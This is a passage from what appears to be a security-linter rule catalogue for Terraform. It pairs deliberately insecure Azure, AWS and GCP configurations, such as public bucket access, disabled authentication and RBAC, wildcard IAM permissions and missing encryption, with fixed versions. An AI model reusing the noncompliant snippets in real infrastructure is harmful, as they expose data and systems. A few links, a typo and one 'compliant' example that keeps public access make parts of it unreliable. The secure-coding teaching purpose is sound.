\"azurerm_api_management_api\" \"example\" { # Sensitive, the openid_authentication block is missing\n  name = \"example-api\"\n}\n\nresource \"azurerm_api_management\" \"example\" {\n  sign_in {\n    enabled = false # Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/data-factory/\">Data Factory</a> Linked Services:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nresource \"azurerm_data_factory_linked_service_sftp\" \"example\" {\n  authentication_type = \"Anonymous\"\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/product-categories/storage/\">Storage Accounts</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nresource \"azurerm_storage_account\" \"example\" {\n  allow_blob_public_access = true # Sensitive\n}\n\nresource \"azurerm_storage_container\" \"example\" {\n  container_access_type = \"blob\" # Sensitive\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/cache/\">Redis Caches</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\nresource \"azurerm_redis_cache\" \"example\" {\n  name = \"example-cache\"\n\n  redis_configuration {\n    enable_authentication = false # Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/\">App Services and equivalent</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_function_app\" \"example\" {\n  name = \"example\"\n\n  auth_settings {\n    enabled = true\n    unauthenticated_client_action = \"RedirectToLoginPage\"\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/api-management/\">API Management</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"azurerm_api_management_api\" \"example\" {\n  name = \"example-api\"\n\n  openid_authentication {\n    openid_provider_name = azurerm_api_management_openid_connect_provider.example.name\n  }\n}\n\nresource \"azurerm_api_management\" \"example\" {\n  sign_in {\n    enabled = true\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/data-factory/\">Data Factory</a> Linked Services:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nresource \"azurerm_data_factory_linked_service_sftp\" \"example\" {\n  authentication_type = \"Basic\"\n  username            = local.creds.username\n  password            = local.creds.password\n}\n\nresource \"azurerm_data_factory_linked_service_odata\" \"example\" {\n  basic_authentication {\n    username = local.creds.username\n    password = local.creds.password\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/product-categories/storage/\">Storage Accounts</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nresource \"azurerm_storage_account\" \"example\" {\n  allow_blob_public_access = true\n}\n\nresource \"azurerm_storage_container\" \"example\" {\n  container_access_type = \"private\"\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/cache/\">Redis Caches</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\nresource \"azurerm_redis_cache\" \"example\" {\n  name = \"example-cache\"\n\n  redis_configuration {\n    enable_authentication = true\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6381": {
        "name": "Assigning high privileges Azure Resource Manager built-in roles is security-sensitive",
        "htmlDesc": "<p>Azure Resource Manager offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully\nassigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>\n<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>\n<p>This rule raises an issue when one of the following roles is assigned:</p>\n<ul>\n  <li> Contributor (b24988ac-6180-42a0-ab88-20f7382dd24c) </li>\n  <li> Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635) </li>\n  <li> User Access Administrator (18d7d88d-d35e-4fb5-a5c3-7773c20a72d9) </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li>\n  <li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Limit the assignment of Owner roles to less than 3 people or service principals. </li>\n  <li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li>\n  <li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"azurerm_role_assignment\" \"example\" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = \"Owner\" # Sensitive\n  principal_id         = data.azuread_user.example.id\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"azurerm_role_assignment\" \"example\" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = \"Azure Maps Data Reader\"\n  principal_id         = data.azuread_user.example.id\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles\">Azure Documentation</a> - Azure built-in roles </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices\">Azure Documentation</a> - Best practices for Azure\n  RBAC </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6383": {
        "name": "Disabling Role-Based Access Control on Azure resources is security-sensitive",
        "htmlDesc": "<p>Disabling Role-Based Access Control (RBAC) on Azure resources can reduce an organization’s ability to protect itself against access controls being\ncompromised.</p>\n<p>To be considered safe, access controls must follow the principle of least privilege and correctly segregate duties amongst users. RBAC helps\nenforce these practices by adapting the organization’s access control needs into explicit role-based policies: It helps keeping access controls\nmaintainable and sustainable.</p>\n<p>Furthermore, RBAC allows operations teams to work faster during a security incident. It helps to mitigate account theft or intrusions by quickly\nshutting down accesses.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Enable Azure RBAC when the Azure resource supports it. </li>\n  <li> For Kubernetes clusters, enable Azure RBAC if Azure AD integration is supported. Otherwise, use the built-in Kubernetes RBAC. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://azure.microsoft.com/fr-fr/services/kubernetes-service/\">Azure Kubernetes Services</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n  role_based_access_control {\n    enabled = false # Sensitive\n  }\n}\n\nresource \"azurerm_kubernetes_cluster\" \"example2\" {\n  role_based_access_control {\n    enabled = true\n\n    azure_active_directory {\n      managed = true\n      azure_rbac_enabled = false # Sensitive\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/fr-fr/services/key-vault/\">Key Vaults</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource \"azurerm_key_vault\" \"example\" {\n  enable_rbac_authorization = false # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://azure.microsoft.com/fr-fr/services/kubernetes-service/\">Azure Kubernetes Services</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n  role_based_access_control {\n    enabled = true\n  }\n}\n\nresource \"azurerm_kubernetes_cluster\" \"example\" {\n  role_based_access_control {\n    enabled = true\n\n    azure_active_directory {\n      managed = true\n      azure_rbac_enabled = true\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/fr-fr/services/key-vault/\">Key Vaults</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"azurerm_key_vault\" \"example\" {\n  enable_rbac_authorization   = true\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6317": {
        "name": "AWS IAM policies should limit the scope of permissions given",
        "htmlDesc": "<p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated\nresources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions\nthan expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher\nlevel of access.</p>\n<h2>Why is this an issue?</h2>\n<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy\nwhich, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)\nare called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>\n<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>\"*\"</code> permissions for example.) This is especially\ntrue if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of\npermissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles\nthat have more permissions than they need.</p>\n<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>\n<h3>What is the potential impact?</h3>\n<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be\nable to perform actions beyond their intended scope.</p>\n<h4>Privilege escalation</h4>\n<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be\nable to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>\n<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and\ndelete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to\nexfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe\nconsequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>\n<h2>How to fix it in AWS Identity and Access Management</h2>\n<h3>Code examples</h3>\n<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by\naltering the code of a Lambda that executes with high privileges.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"aws_iam_policy\" \"example\" {\n  name = \"example\"\n  policy =&lt;&lt;EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"lambda:UpdateFunctionCode\"\n            ],\n            \"Resource\": \"*\"\n        }\n    ]\n}\nEOF\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"aws_iam_policy\" \"example\" {\n  name = \"example\"\n  policy =&lt;&lt;EOF\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"lambda:UpdateFunctionCode\"\n            ],\n            \"Resource\": \"arn:aws:lambda:us-east-2:123456789012:function:my-function:1\"\n        }\n    ]\n}\nEOF\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Principle of least privilege</h4>\n<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted\nenough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>\n<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy\nwith overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.\nIn this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv\">Policies and permissions\n  in IAM: Grant least privilege</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Rhino Security Labs - <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\">AWS IAM Privilege Escalation -\n  Methods and Mitigation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-269 - Improper Privilege Management</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "terraform:S6319": {
        "name": "Using unencrypted SageMaker notebook instances is security-sensitive",
        "htmlDesc": "<p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker\ninstances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries\nphysically access the storage media, they cannot decrypt encrypted data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The instance contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by\nSageMaker, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sagemaker_notebook_instance\">aws_sagemaker_notebook_instance</a>:</p>\n<pre>\nresource \"aws_sagemaker_notebook_instance\" \"notebook\" {  # Sensitive, encryption disabled by default\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sagemaker_notebook_instance\">aws_sagemaker_notebook_instance</a>:</p>\n<pre>\nresource \"aws_sagemaker_notebook_instance\" \"notebook\" {\n  kms_key_id = aws_kms_key.enc_key.key_id\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html\">Protect Data at Rest Using Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6382": {
        "name": "Disabling certificate-based authentication is security-sensitive",
        "htmlDesc": "<p>Disabling certificate-based authentication can reduce an organization’s ability to react against attacks on its critical functions and data.</p>\n<p>Azure offers various authentication options to access resources: Anonymous connections, Basic authentication, password-based authentication, and\ncertificate-based authentication.</p>\n<p>Choosing certificate-based authentication helps bring client/host trust by allowing the host to verify the client and vice versa. It cannot be\nforged or forwarded by a man-in-the-middle eavesdropper, and the certificate’s private key is never sent over the network so it’s harder to steal than\na password.</p>\n<p>In case of a security incident, certificates help bring investigators traceability and allow security operations teams to react faster. For\nexample, all compromised certificates could be revoked individually, or an issuing certificate could be revoked which causes all the certificates it\nissued to become untrusted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> Compliance policies require access to this resource to be authenticated with certificates. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable certificate-based authentication.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/\">App Service</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_app_service\" \"example\" {\n  client_cert_enabled = false # Sensitive\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/logic-apps/\">Logic App Standards</a> and <a\nhref=\"https://azure.microsoft.com/en-us/services/functions/\">Function Apps</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource \"azurerm_function_app\" \"example\" {\n  client_cert_mode = \"Optional\" # Sensitive\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/data-factory/\">Data Factory Linked Services</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nresource \"azurerm_data_factory_linked_service_web\" \"example\" {\n  authentication_type = \"Basic\" # Sensitive\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/api-management/\">API Management</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"noncompliant\">\nresource \"azurerm_api_management\" \"example\" {\n  sku_name = \"Consumption_1\"\n  client_certificate_mode = \"Optional\" # Sensitive\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/containers/\">Linux and Windows Web Apps</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"noncompliant\">\nresource \"azurerm_linux_web_app\" \"example\" {\n  client_cert_enabled = false # Sensitive\n}\nresource \"azurerm_linux_web_app\" \"exemple2\" {\n  client_cert_enabled = true\n  client_cert_mode = \"Optional\" # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/\">App Service</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_app_service\" \"example\" {\n  client_cert_enabled = true\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/logic-apps/\">Logic App Standards</a> and <a\nhref=\"https://azure.microsoft.com/en-us/services/functions/\">Function Apps</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"azurerm_function_app\" \"example\" {\n  client_cert_mode = \"Required\"\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/data-factory/\">Data Factory Linked Services</a>:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nresource \"azurerm_data_factory_linked_service_web\" \"example\" {\n  authentication_type = \"ClientCertificate\"\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/api-management/\">API Management</a>:</p>\n<pre data-diff-id=\"4\" data-diff-type=\"compliant\">\nresource \"azurerm_api_management\" \"example\" {\n  sku_name = \"Consumption_1\"\n  client_certificate_mode = \"Required\"\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/containers/\">Linux and Windows Web Apps</a>:</p>\n<pre data-diff-id=\"5\" data-diff-type=\"compliant\">\nresource \"azurerm_linux_web_app\" \"exemple\" {\n  client_cert_enabled = true\n  client_cert_mode = \"Required\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6270": {
        "name": "Policies authorizing public access to resources are security-sensitive",
        "htmlDesc": "<p>Resource-based policies granting access to all users can lead to information leakage.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The AWS resource stores or processes sensitive data. </li>\n  <li> The AWS resource is designed to be private. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the\ncontext of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>\n<h2>Sensitive Code Example</h2>\n<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>\n<pre>\nresource \"aws_s3_bucket_policy\" \"mynoncompliantpolicy\" {  # Sensitive\n  bucket = aws_s3_bucket.mybucket.id\n  policy = jsonencode({\n    Id = \"mynoncompliantpolicy\"\n    Version = \"2012-10-17\"\n    Statement = [{\n            Effect = \"Allow\"\n            Principal = {\n                AWS = \"*\"\n            }\n            Action = [\n                \"s3:PutObject\"\n            ]\n            Resource: \"${aws_s3_bucket.mybucket.arn}/*\"\n        }\n    ]\n  })\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>This policy allows only the authorized users:</p>\n<pre>\nresource \"aws_s3_bucket_policy\" \"mycompliantpolicy\" {\n  bucket = aws_s3_bucket.mybucket.id\n  policy = jsonencode({\n    Id = \"mycompliantpolicy\"\n    Version = \"2012-10-17\"\n    Statement = [{\n            Effect = \"Allow\"\n            Principal = {\n                AWS = [\n                    \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"\n                ]\n            }\n            Action = [\n                \"s3:PutObject\"\n            ]\n            Resource = \"${aws_s3_bucket.mybucket.arn}/*\"\n        }\n    ]\n  })\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "terraform:S6275": {
        "name": "Using unencrypted EBS volumes is security-sensitive",
        "htmlDesc": "<p>Amazon Elastic Block Store (EBS) is a block-storage service for Amazon Elastic Compute Cloud (EC2). EBS volumes can be encrypted, ensuring the\nsecurity of both data-at-rest and data-in-transit between an instance and its attached EBS storage. In the case that adversaries gain physical access\nto the storage medium they are not able to access the data. Encryption can be enabled for specific volumes or for <a\nhref=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html#encryption-by-default\">all new volumes and snapshots</a>. Volumes created\nfrom snapshots inherit their encryption configuration. A volume created from an encrypted snapshot will also be encrypted by default.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The disk contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt EBS volumes that contain sensitive information. Encryption and decryption are handled transparently by EC2, so no\nfurther modifications to the application are necessary. Instead of enabling encryption for every volume, it is also possible to enable encryption\nglobally for a specific region. While creating volumes from encrypted snapshots will result in them being encrypted, explicitly enabling this security\nparameter will prevent any future unexpected security downgrade.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume\">aws_ebs_volume</a>:</p>\n<pre>\nresource \"aws_ebs_volume\" \"ebs_volume\" {  # Sensitive as encryption is disabled by default\n}\n</pre>\n<pre>\nresource \"aws_ebs_volume\" \"ebs_volume\" {\n  encrypted = false  # Sensitive\n}\n</pre>\n<p>For <a\nhref=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_encryption_by_default\">aws_ebs_encryption_by_default</a>:</p>\n<pre>\nresource \"aws_ebs_encryption_by_default\" \"default_encryption\" {\n  enabled = false  # Sensitive\n}\n</pre>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration\">aws_launch_configuration</a>:</p>\n<pre>\nresource \"aws_launch_configuration\" \"launch_configuration\" {\n  root_block_device {  # Sensitive as encryption is disabled by default\n  }\n  ebs_block_device {  # Sensitive as encryption is disabled by default\n  }\n}\n</pre>\n<pre>\nresource \"aws_launch_configuration\" \"launch_configuration\" {\n  root_block_device {\n    encrypted = false  # Sensitive\n  }\n  ebs_block_device {\n    encrypted = false  # Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume\">aws_ebs_volume</a>:</p>\n<pre>\nresource \"aws_ebs_volume\" \"ebs_volume\" {\n  encrypted = true\n}\n</pre>\n<p>For <a\nhref=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_encryption_by_default\">aws_ebs_encryption_by_default</a>:</p>\n<pre>\nresource \"aws_ebs_encryption_by_default\" \"default_encryption\" {\n  enabled = true  # Optional, default is \"true\"\n}\n</pre>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration\">aws_launch_configuration</a>:</p>\n<pre>\nresource \"aws_launch_configuration\" \"launch_configuration\" {\n  root_block_device {\n    encrypted = true\n  }\n  ebs_block_device {\n    encrypted = true\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html\">Amazon EBS encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6327": {
        "name": "Using unencrypted SNS topics is security-sensitive",
        "htmlDesc": "<p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)\ncommunication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages\nwhen they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to\naccess the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The topic contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no\nfurther modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic\">aws_sns_topic</a>:</p>\n<pre>\nresource \"aws_sns_topic\" \"topic\" {  # Sensitive, encryption disabled by default\n  name = \"sns-unencrypted\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic\">aws_sns_topic</a>:</p>\n<pre>\nresource \"aws_sns_topic\" \"topic\" {\n  name = \"sns-encrypted\"\n  kms_master_key_id = aws_kms_key.enc_key.key_id\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html\">AWS Documentation</a> - Encryption at rest </li>\n  <li> <a href=\"https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/\">Encrypting messages published to\n  Amazon SNS with AWS KMS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6404": {
        "name": "Granting public access to GCP resources is security-sensitive",
        "htmlDesc": "<p>Granting public access to GCP resources may reduce an organization’s ability to protect itself against attacks or theft of its GCP resources.<br>\nSecurity incidents associated with misuse of public access include disruption of critical functions, data theft, and additional costs due to resource\noverload.</p>\n<p>To be as prepared as possible in the event of a security incident, authentication combined with fine-grained permissions helps maintain the\nprinciple of defense in depth and trace incidents back to the perpetrators.</p>\n<p>GCP also provides the ability to grant access to a large group of people:</p>\n<ul>\n  <li> If public access is granted to all Google users, the impact of a data theft is the same as if public access is granted to all Internet users.\n  </li>\n  <li> If access is granted to a large Google group, the impact of a data theft is limited based on the size of the group. </li>\n</ul>\n<p>The only thing that changes in these cases is the ability to track user access in the event of an incident.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This GCP resource is essential to the information system infrastructure. </li>\n  <li> This GCP resource is essential to mission-critical functions. </li>\n  <li> This GCP resource stores or processes sensitive data. </li>\n  <li> Compliance policies require that access to this resource be authenticated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Explicitly set access to this resource or function as private.</p>\n<h2>Sensitive Code Example</h2>\n<p>For IAM resources:</p>\n<pre>\nresource \"google_cloudfunctions_function_iam_binding\" \"example\" {\n  members = [\n    \"allUsers\",              # Sensitive\n    \"allAuthenticatedUsers\", # Sensitive\n  ]\n}\n\nresource \"google_cloudfunctions_function_iam_member\" \"example\" {\n  member = \"allAuthenticatedUsers\" # Sensitive\n}\n</pre>\n<p>For ACL resources:</p>\n<pre>\nresource \"google_storage_bucket_access_control\" \"example\" {\n  entity = \"allUsers\" # Sensitive\n}\n\nresource \"google_storage_bucket_acl\" \"example\" {\n  role_entity = [\n    \"READER:allUsers\",              # Sensitive\n    \"READER:allAuthenticatedUsers\", # Sensitive\n  ]\n}\n</pre>\n<p>For container clusters:</p>\n<pre>\nresource \"google_container_cluster\" \"example\" {\n  private_cluster_config {\n    enable_private_nodes    = false # Sensitive\n    enable_private_endpoint = false # Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For IAM resources:</p>\n<pre>\nresource \"google_cloudfunctions_function_iam_binding\" \"example\" {\n  members = [\n    \"serviceAccount:${google_service_account.example.email}\",\n    \"group:${var.example_group}\"\n  ]\n}\n\nresource \"google_cloudfunctions_function_iam_member\" \"example\" {\n  member = \"user:${var.example_user}\" # Sensitive\n}\n</pre>\n<p>For ACL resources:</p>\n<pre>\nresource \"google_storage_bucket_access_control\" \"example\" {\n  entity = \"user-${var.example_user]\"\n}\n\nresource \"google_storage_bucket_acl\" \"example\" {\n  role_entity = [\n    \"READER:user-name@example.com\",\n    \"READER:group-admins@example.com\"\n  